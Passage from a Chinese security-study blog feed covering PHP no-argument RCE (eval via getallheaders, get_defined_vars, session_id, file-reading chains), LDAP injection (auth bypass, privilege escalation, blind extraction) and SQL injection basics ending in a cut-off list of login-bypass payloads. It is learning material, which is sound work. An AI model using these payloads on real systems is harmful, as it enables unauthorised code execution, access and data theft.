是递归引用，<strong>它只能匹配和替换嵌套的函数调用，而不能处理函数参数</strong>。使用该正则表达式进行替换后，每个函数调用都会被删除，只剩下一个分号 ;，而最终结果强等于；时，payload才能进行下一步。简而言之，<strong>无参数rce就是不使用参数，而只使用一个个函数最终达到目的</strong>。</p></blockquote><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>无参数rce可能用到的函数:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目录操作：</span><br><span class="line">getchwd() ：函数返回当前工作目录。</span><br><span class="line">scandir() ：函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">数组相关的操作：</span><br><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">array_shift() - 删除数组中第一个元素，并返回被删除元素的值。</span><br><span class="line">array_reverse() -逆转数组</span><br><span class="line">array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。</span><br><span class="line">array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，                         array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完               成后，就可以根据随机的键获取数组的随机值。</span><br><span class="line"> array_flip()和array_rand()配合使用可随机返回当前目录下的文件名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">读文件</span><br><span class="line">show_source() - 对文件进行语法高亮显示。</span><br><span class="line">readfile() - 输出一个文件。</span><br><span class="line">highlight_file() - 对文件进行语法高亮显示。</span><br><span class="line">file_get_contents() - 把整个文件读入一个字符串中。</span><br><span class="line">readgzfile() - 可用于读取非 gzip 格式的文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关键函数：</span><br><span class="line">getenv() ：获取环境变量的值  </span><br><span class="line">           php7.0以下返回bool(false)</span><br><span class="line">           php7.0以上正常回显</span><br><span class="line">           payload:</span><br><span class="line">           ?code=var_dump(getenv());</span><br><span class="line">           ?code=var_dump(getenv(phpinfo()));</span><br><span class="line">           </span><br><span class="line">           </span><br><span class="line">           </span><br><span class="line">getallheaders()：获取所有 HTTP 请求标头，是apache_request_headers()的别名函                    数，但是该函数只能在Apache环境下使用</span><br><span class="line"></span><br><span class="line">                  payload:</span><br><span class="line">                  1) GET /1.php?code=eval(end(getallheaders()));                              HTTP/1.1</span><br><span class="line">                     .....</span><br><span class="line">                     flag: system(&#x27;id&#x27;);</span><br><span class="line">                  2) GET /1.php?exp=eval(end(apache_request_headers()));                      HTTP/1.1</span><br><span class="line">                     ....</span><br><span class="line">                     flag: system(&#x27;id&#x27;);      php7以上</span><br><span class="line">                    </span><br><span class="line">                     </span><br><span class="line">                     </span><br><span class="line">get_defined_vars()：返回由所有已定义变量所组成的数组，会返回$_GET</span><br><span class="line">                   ,$_POST,$_COOKIE,$_FILES全局变量的值，返回数组顺序为get-                       &gt;post-&gt;cookie-&gt;files</span><br><span class="line">           current()：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也                        就是会返回$_GET变量的数组值</span><br><span class="line">          payload:</span><br><span class="line">          1） code=eval(end(current(get_defined_vars())));</span><br><span class="line">              &amp;flag=system(&#x27;ls&#x27;);    利用全局变量进RCE</span><br><span class="line">          2）flag=system(&#x27;id&#x27;);&amp;code=eval(pos(pos(get_defined_vars())));</span><br><span class="line">           </span><br><span class="line">           pos() 函数返回数组中的当前元素的值。</span><br><span class="line"></span><br><span class="line">           该函数是 current() 函数的别名。</span><br><span class="line">                  </span><br><span class="line">                  </span><br><span class="line">                 </span><br><span class="line">session_start()：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回                      FALSE,返回参数给session_id()</span><br><span class="line">session_id()：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符               串（””）</span><br><span class="line">scandir()  文件读取</span><br></pre></td></tr></table></figure><h4 id="法1-4"><a href="#法1-4" class="headerlink" title="法1"></a>法1</h4><p><strong>getallheaders()</strong></p><p>这个函数的作用是获取http所有的头部信息，也就是headers，然后我们可以用var_dump把它打印出来，但这个有个限制条件就是必须在apache的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161d16d995.png" alt="image-20240401220518864"></p><p>可以看到，所有的头部信息都已经作为了一个数组打印了出来。但我们在实际的利用过程中并用不了这么多的，我们需要有选择的执行一些命令，这里就需要用到php中操纵数组的函数了，这里常见的是利用end()函数取出最后一位，并且只会取值，不会取键，所以键名随便取：</p><p><img src="https://bu.dusays.com/2024/05/13/664161d11991a.png" alt="image-20240401220554490"></p><p>结合上面一些其他相关函数</p><p>即可实现命令执行</p><p><img src="https://bu.dusays.com/2024/05/13/664161d22e250.png" alt="image-20240401221109115"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(array_rand(array_flip(getallheaders())));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(end(getallheaders()))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(pos(array_reverse(getallheaders())))</span><br></pre></td></tr></table></figure><p>都要传header</p><p><img src="https://bu.dusays.com/2024/05/13/664161cdd0404.png" alt="image-20240401221541707"></p><h4 id="法2-4"><a href="#法2-4" class="headerlink" title="法2"></a>法2</h4><p>get_defined_vars()</p><p><code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的</p><p><img src="https://bu.dusays.com/2024/05/13/664161d1c5281.png" alt="image-20240401221848316"></p><p>可以看到，它并不是获取的headers，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组，我们利用GET方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<strong>current()<strong>函数，这个函数的作用是</strong>返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数</strong>，我们可以看看实际效果:</p><p><img src="https://bu.dusays.com/2024/05/13/664161d0a282c.png" alt="image-20240401222003408"></p><p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用**<code>end()</code>函数以字符串的形式取出最后的值**，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了：</p><p><img src="https://bu.dusays.com/2024/05/13/664161d273720.png" alt="image-20240401222138752"></p><p><img src="https://bu.dusays.com/2024/05/13/664161d097103.png" alt="image-20240401222154762"></p><p>那我们把var_dump改成eval即可执行我们的phpinfo代码</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf49001.png" alt="image-20240401222220294"></p><p>那同样也能执行whoami命令</p><p><img src="https://bu.dusays.com/2024/05/13/664161d1350fe.png" alt="image-20240401222319324"></p><p>总结一下，这种方法和第一种方法几乎是一样的，就多了一步，就是利用<code>current()</code>函数将二维数组转换为一维数组</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(end(current(get_defined_vars())));</span><br><span class="line">&amp;flag=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag=system(&#x27;id&#x27;);</span><br><span class="line">eval(pos(pos(get_defined_vars())))</span><br></pre></td></tr></table></figure><h4 id="法3-2"><a href="#法3-2" class="headerlink" title="法3"></a>法3</h4><p>session_id()</p><p>简单来说就是<strong>把恶意代码写到COOKIE的PHPSESSID</strong>中，然后利用session_id()这个函数去读取它，返回一个字符串，然后我们就可以用eval去直接执行了，这里有一点要注意的就是session_id()要开启session才能用，所以说要先session_start()，这里我们先试着把PHPSESSID的值取出来：<br><img src="https://bu.dusays.com/2024/05/13/664161d233292.png" alt="image-20240401222557307"></p><p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将<strong>恶意代码16进制编码</strong>以后再插入进去，而在php中，<strong>将16进制转换为字符串的函数为<code>hex2bin</code></strong></p><p><img src="https://bu.dusays.com/2024/05/13/664161cda411d.png" alt="image-20240401222635617"></p><p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，同时我们还要加上hex2bin函数</p><p><img src="https://bu.dusays.com/2024/05/13/664161d1a2a51.png" alt="image-20240401222701625"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(hex2bin(session_id(session_star())))</span><br><span class="line">cookie:PHPSESSIID=706870696e666f28293b     phpinfo();</span><br></pre></td></tr></table></figure><h4 id="法4-1"><a href="#法4-1" class="headerlink" title="法4"></a>法4</h4><p><strong>php函数直接读取文件</strong></p><p>上面我们一直在想办法在进行rce，但有的情况下确实无法进行rce时，我们就要想办法直接利用php函数完成对目录以及文件的操作， 接下来我们就来介绍这些函数：</p><h5 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a>localeconv()</h5><p>localeconv() 函数返回一个包含本地数字及货币格式信息的数组</p><p>我们在代码中将<code>localeconv()</code>的返回结果输出出来，它返回的是一个二维数组，而它的第一位居然是一个点.</p><p>那按照我们上面讲的，是可以利用<code>current()</code>函数将这个点取出来的，但这个点有什么用呢？点代表的是当前目录！我们可以利用这个点完成遍历目录的操作！相当于就是<code>linux</code>中的<code>ls</code></p><p><img src="https://bu.dusays.com/2024/05/13/664161cf1dd7e.png" alt="image-20240401223458115"></p><p>我们利用current函数把这个点取出来</p><p><img src="https://bu.dusays.com/2024/05/13/664161d177d59.png" alt="image-20240401223536322"></p><p>完成目录遍历操作</p><p><img src="https://bu.dusays.com/2024/05/13/664161cfb1d0f.png" alt="image-20240401223600546"></p><h5 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h5><p>scandir() 函数返回指定目录中的文件和目录的数组。</p><h5 id="current-pos"><a href="#current-pos" class="headerlink" title="current(pos)"></a>current(pos)</h5><p>pos()函数是current()函数的别名，两者是一样的</p><p>current() 函数返回数组中的当前元素（单元）。</p><p>每个数组中都有一个内部的指针指向它“当前的”元素，初始指向插入到数组中的第一个元素。</p><h5 id="dirname-和chdir"><a href="#dirname-和chdir" class="headerlink" title="dirname()和chdir()"></a>dirname()和chdir()</h5><p>chadir()这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为scandir()会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用chdir切就好了，如果要向上跳就要构造chdir(‘..’)</p><p>首先我们可以利用getcwd()获取当前目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(getcwd());</span><br><span class="line"></span><br><span class="line">string(13) &quot;/var/www/html&quot;</span><br></pre></td></tr></table></figure><p>那么怎么进行当前目录的目录遍历呢？<br>这里用scandir()即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br><span class="line"></span><br><span class="line">array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure><p>那么既然不在这一层目录，如何进行目录上跳呢？<br>我们用dirname()即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(scandir(dirname(getcwd())));</span><br><span class="line"></span><br><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(14) &quot;flag_phpbyp4ss&quot; [3]=&gt; string(4) &quot;html&quot; &#125;</span><br></pre></td></tr></table></figure><p>那么怎么更改我们的当前目录呢？这里我们发现有函数可以更改当前目录</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chdir ( string $directory ) : bool</span><br></pre></td></tr></table></figure><p>将 PHP 的当前目录改为 directory。<br>所以我们这里在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirname(getcwd())</span><br></pre></td></tr></table></figure><p> 进行如下设置即可</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chdir(dirname(getcwd()))</span><br></pre></td></tr></table></figure><p>我们尝试读取&#x2F;var&#x2F;www&#x2F;123</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure><p>即可进行文件读取</p><h5 id="array-reverse"><a href="#array-reverse" class="headerlink" title="array_reverse()"></a>array_reverse()</h5><p>array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。</p><p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个next()</p><h5 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file()"></a>highlight_file()</h5><p>取文件的打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 后端漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LDAP注入</title>
      <link href="/2024/05/13/LDAP%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/05/13/LDAP%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h1><p>几乎不考 考了再学  已学</p><h2 id="1-LDAP介绍"><a href="#1-LDAP介绍" class="headerlink" title="1.LDAP介绍"></a>1.LDAP介绍</h2><p> LDAP不定义客户端和服务端的工作方式，但会定义客户端和服务端的通信方式，另外，LDAP还会定义LDAP数据库的访问权限及服务端数据的格式和属性。LDAP有三种基本的通信机制：没有处理的匿名访问；基本的用户名、密码形式的认证；使用SASL、SSL的安全认证方式。LDAP和其他一些协议走的是同一个套路，基于tcp&#x2F;ip协议通信，注重服务的可用性、信息的保密性等等，除此之外还要回到那个最原始的问题：信任，当然信息安全的本质问题就是信任的问题。部署了LDAP的应用不会直接访问，目录中的内容，一般通过函数调用或者API，应用可以通过定义的C、Java的API进行访问，Java应用的访问方式为JNDI(Java Naming and Directory Interface)。</p><p>LDAP的URL形式为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldap://&lt;host&gt;:&lt;port&gt;/&lt;path&gt;，&lt;path&gt;:&lt;dn&gt;[?&lt;artribute&gt;[?&lt;scope&gt;?&lt;filter&gt;]]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如： ldap://austin.ibm.com/ou=Austin,o=IBM    ldap:///ou=Austin,o=IBM??sub?(cn=Joe Q. Public)</span><br></pre></td></tr></table></figure><p>看得出来在URL中这里使用逗号分隔查询，而数据库查询则使用’&amp;’号，这是LDAP特有的，另外这里o表示组织(organization)，u表示单元(unit)，cn表示country name，</p><p>LDAP注入攻击和SQL注入攻击相似，因此接下来的想法是利用用户引入的参数生成LDAP查询。一个安全的Web应用在构造和将查询发送给服务器前应该净化用户传入的参数。在有漏洞的环境中，这些参数没有得到合适的过滤，因而攻击者可以注入任意恶意代码。</p><p>测试一个应用是否存在代码注入漏洞典型的方法是向服务器发送会生成一个无效输入的请求。因此，如果服务器返回一个错误消息，攻击者就能知道服务器执行了他的查询，他可以利用代码注入技术。回想一下之前讨论的，我们可以将注入环境分为两种：AND注入环境和OR注入环境。</p><h2 id="2-LDAP注入攻击"><a href="#2-LDAP注入攻击" class="headerlink" title="2.LDAP注入攻击"></a>2.LDAP注入攻击</h2><h3 id="AND-LDAP注入"><a href="#AND-LDAP注入" class="headerlink" title="AND LDAP注入"></a>AND LDAP注入</h3><p>这种情况，应用会构造由”&amp;”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(parameter1=value1)(parameter2=value2))</span><br></pre></td></tr></table></figure><p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p><p>绕过访问控制</p><p>一个登陆页有两个文本框用于输入用户名和密码，过滤器如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(USER=Uname)(PASSWORD=Pwd)) </span><br></pre></td></tr></table></figure><p>如果攻击者输入一个有效地用户名，如r00tgrok，然后再这个名字后面注入恰当的语句，password检查就会被绕过。输入Uname&#x3D;slisberger)(&amp;))，得到如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(USER= slisberger)(&amp;)(PASSWORD=Pwd))</span><br></pre></td></tr></table></figure><p>LDAP服务器只处理第一个过滤器，即仅查询(&amp;(USER&#x3D;slidberger)(&amp;))得到了处理。这个查询永真,故成功绕过</p><p>权限提升</p><p>现假设下面的查询会向用户列举出所有可见的低安全等级文档：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=document)(security_level=low)) </span><br></pre></td></tr></table></figure><p>这里第一个参数document是用户入口，low是第二个参数的值。如果攻击者想列举出所有可见的高安全等级的文档，他可以利用如下的注入：document)(security_level&#x3D;*))(&amp;(directory&#x3D;documents<br>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=documents)(security_level=*))(&amp;(direcroty=documents)(security_level=low))</span><br></pre></td></tr></table></figure><p>LDAP服务器仅会处理第一个过滤器而忽略第二个，因而只有下面的查询会被处理：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=documents)(security_level=*))</span><br></pre></td></tr></table></figure><p>结果就是，所有安全等级的可用文档都会列举给攻击者</p><h3 id="OR注入"><a href="#OR注入" class="headerlink" title="OR注入"></a>OR注入</h3><p>这种情况，应用会构造由”|”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(|(parameter1=value1)(parameter2=value2))</span><br></pre></td></tr></table></figure><p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p><p>具体的注入方式和AND差不太多</p><h2 id="3-LDAP盲注"><a href="#3-LDAP盲注" class="headerlink" title="3.LDAP盲注"></a>3.LDAP盲注</h2><h3 id="AND盲注"><a href="#AND盲注" class="headerlink" title="AND盲注"></a>AND盲注</h3><p>假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass=printer)(type=Epson*))</span><br></pre></td></tr></table></figure><p>正确的过滤器为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass=printer)(type=Epson*))</span><br></pre></td></tr></table></figure><p><code>而当注入*)(objectClass=*))(&amp;(objectClass=void时得到</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass=*)(objectClass=*))(&amp;(objectClass=void)(type=Epson*))</span><br></pre></td></tr></table></figure><p>总是返回一个对象。当图标被显示时响应为真，否则为假。<br>这样我们就可以猜第二个括号的objectclass字段有些什么内容了。<br>LDAP盲注技术让攻击者使用基于TRUE&#x2F;FALSE的技术访问所有的信息。</p><h3 id="OR盲注"><a href="#OR盲注" class="headerlink" title="OR盲注"></a>OR盲注</h3><p>这种情况下，用于推测想要的信息的逻辑与AND是相反的，因为使用的是OR逻辑操作符。同样不予详述。</p><p>盲注深入</p><p>攻击者可以使用字母、数字搜索提取属性的值，这个想法的关键在于将一个复杂的值转化为TRUE&#x2F;FALSE列表。这个机制，通常称为booleanization，大意是二值化吧，图十二概括了该机制，可用于不同的方式。<br>假设攻击者想知道department属性的值，处理如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(idprinter=HPLaserJet2100)(department=a*))(object=printer))</span><br><span class="line">(&amp;(idprinter=HPLaserJet2100)(department=f*))(object=printer))</span><br><span class="line">(&amp;(idprinter=HPLaserJet2100)(department=fa*))(object=printer))</span><br></pre></td></tr></table></figure><p>如此根据返回的不同结果猜解是否正确，和MYSQL盲注类似。<br>同样，攻击者可以使用字符集削减技术减少获得信息所需的请求数，为完成这一点，他使用通配符测试给定的字符在值中是否为anywhere：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(idprinter=HPLaserJet2100)(department=*b*))(object=printer))</span><br><span class="line">(&amp;(idprinter=HPLaserJet2100)(department=*n*))(object=printer))</span><br></pre></td></tr></table></figure><p>这样子可以看department中是否有b和n，巧用可以加速猜解过程，当然一般肯定都是写脚本猜解</p><h2 id="4-防御LDAP注入"><a href="#4-防御LDAP注入" class="headerlink" title="4.防御LDAP注入"></a>4.防御LDAP注入</h2><p> 总而言之，我们看到圆括号、星号、逻辑操作符、关系运操作符在应用层都必须过滤。无论什么时候，只要可能，构造LDAP搜索过滤器的值在发送给LDAP服务器查询之前都要用应用层有效地值列表来核对。正则表达式替换掉就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 后端漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2024/05/13/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/05/13/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>后端漏洞</p><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>SQL 是用于访问和处理数据库的标准的计算机语言</p><p>primary key: 主键   用于区分表格中的元素  使元素唯一确定   可以多个</p><p>foreign key :外键  用于对应另一表格的主键</p><p>创建资料库： CREATE DATABASE <code> 资料库 名字</code>(反引号);</p><p>列出所有资料库：SHOW DATABASES;</p><p>删除资料库：DROP DATABASE<code>资料库名字</code>;</p><p>选择资料库：USE<code>资料库名</code></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>INT       整数</p><p>DECIMAL(X,Y)   有小数点的小数  两个参数</p><p>VARCHAR(N)   字符串   n：最多存放的字符数</p><p>BLOB:   二进制资料（图片  影片  档案）</p><p>DATE:    日期   XX-YY-DD</p><p>TIMESTAMP :    记录时间  XXXX-CC-VV  FF:AA:KK</p><p>创建表格：CREATE TABLE <code>表格名</code>（</p><p>​                   <code>属性名</code>+类型+PK                  </p><p>​                   <code>属性名</code>+类型</p><p>​                    ……</p><p>​              ）；</p><p>展示表格： DESCRIBE<code>表格名</code></p><p>删除表格：DROP  TABLE<code>表格名</code></p><p>新增表格属性：ALTER TABLE<code>表格名</code>ADD  属性 类型</p><p>删除表格属性：ALTER TABLE<code>表格名</code>DROP  COLUMN 属性 </p><p>向表格中存资料：INSERT INTO 表格名 VALUES 属性</p><p>搜寻表格中的全部资料：SELECT*REOM 表格名</p><p>限制：在创建TABLE时在属性后可以加限制</p><p>​           NOT NULL   不可用为空</p><p>​           VNIQUE    不可重复</p><p>​          DEFAULT  预设值</p><p>​          AUTO-INCREMENT   自动加一</p><p>修改资料：UPDATE 表格名  </p><p>、              SET 属性名 &#x3D;改后名</p><p>​                 WHERE 属性名&#x3D;原来名</p><p>删除资料：DELETE FROM 表格名</p><p>​                    WHERE 属性&#x3D;XX AND 属性&#x3D;xx                   &lt;, &gt;, &lt;&gt;  ,等也可以</p><p>取得资料：SELECT 属性，属性FROM表格    （后面也可以加限制）</p><p>排序: ~ORDER BY(属性由高到低 从上到下)   </p><p>​                         ~   DESC(反过来)</p><p>去不重复的资料： SELECT DISTINCT ~</p><p>聚合函数：COUNT    表格中的某属性的总数</p><p>​                   AVG         算平均</p><p>​                   MAX         算最高</p><p>​                   MIN          算最低</p><p>​                   SUM        算总和</p><p>万用字符：%   多字符     -一个字符</p><p>UNION:将XX于XX连接在一起（多个搜寻结合）</p><p>JOIN：连结两个表格</p><p>子查询:     ~</p><p>​                WHERE XX(</p><p>SECECT……</p><p>)</p><p>ON DELETE:若删去一项，则另一项也将改变</p><p>​                         ON DELETE  SET NULL   变成NULL</p><p>​                         ON DELETE CASCADE     一起删去</p><p>单行注释：#      –</p><p>   多行注释：&#x2F;*</p><p>​                      </p><p>​                    *&#x2F;</p><p>内联注释：&#x2F;*！</p><p>​                           *&#x2F;</p><p>   保持与其他数据兼容 在不兼容的数据库中不执行，而在MySQL中执行</p><h1 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h1><p>原理：通过在向数据库的sql语言中进行一些更改，使原来的指令发生一些改变，进而获取一些本得不到的信息</p><p>查库名–&gt;查表名–&gt;查字段</p><h3 id="简单分类"><a href="#简单分类" class="headerlink" title="简单分类"></a>简单分类</h3><h4 id="1-按数据类型分类"><a href="#1-按数据类型分类" class="headerlink" title="1.按数据类型分类"></a>1.按数据类型分类</h4><p><code>①数字型注入点</code><br> 在 Web 端大概是 <a href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。这一类的 SQL 语句原型大概为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where id=1。组合出来的sql注入语句为：select * from news where id=1 and 1=1</span><br></pre></td></tr></table></figure><p><code>②字符型注入点</code><br> 在 Web 端大概是 <a href="http://xxx.com/news.php?name=admin">http://xxx.com/news.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where name=&#x27;admin&#x27;注意多了引号。组合出来的sql注入语句为：select * from news where chr=&#x27;admin&#x27; and 1=1 &#x27; &#x27;</span><br></pre></td></tr></table></figure><p><code>③搜索型注入点</code><br>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword&#x3D;关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where 字段 like &#x27;%关键字%&#x27;。</span><br><span class="line"></span><br><span class="line">组合出来的sql注入语句为：</span><br><span class="line">select * from news where search like &#x27;%测试 %&#x27; and &#x27;%1%&#x27;=&#x27;%1%&#x27;</span><br><span class="line"></span><br><span class="line">测试%&#x27; union select 1,2,3,4 and &#x27;%&#x27;=&#x27;</span><br></pre></td></tr></table></figure><h4 id="2-按照数据提交的方式来分类"><a href="#2-按照数据提交的方式来分类" class="headerlink" title="2.按照数据提交的方式来分类"></a>2.按照数据提交的方式来分类</h4><p><code>①GET 注入</code><br>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> , id 是注入点。</p><p><code>②POST 注入</code><br>使用 POST 方式提交数据，注入点位置在 POST 数据部分，post提交方式主要适用于表单的提交，用于登录框的注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用的万能username语句：</span><br><span class="line"> a ’ or 1=1 #</span><br><span class="line"> a &quot;) or 1=1 #</span><br><span class="line"> a‘) or 1=1 #</span><br><span class="line"> a” or “1”=”1</span><br><span class="line"> &#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line"> &#x27; or (length(database())) = 8  (用于输入’ “都没有错误)</span><br><span class="line"> &#x27; or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)</span><br><span class="line"> &quot;) or (&quot;1&quot;)=(&quot;1</span><br><span class="line"> &quot;) or 1=1 or if(1=1, sleep(1), null)  #</span><br><span class="line"> &quot;) or (length(database())) = 8 #</span><br><span class="line"> &quot;) or (ascii(substr((select database()) 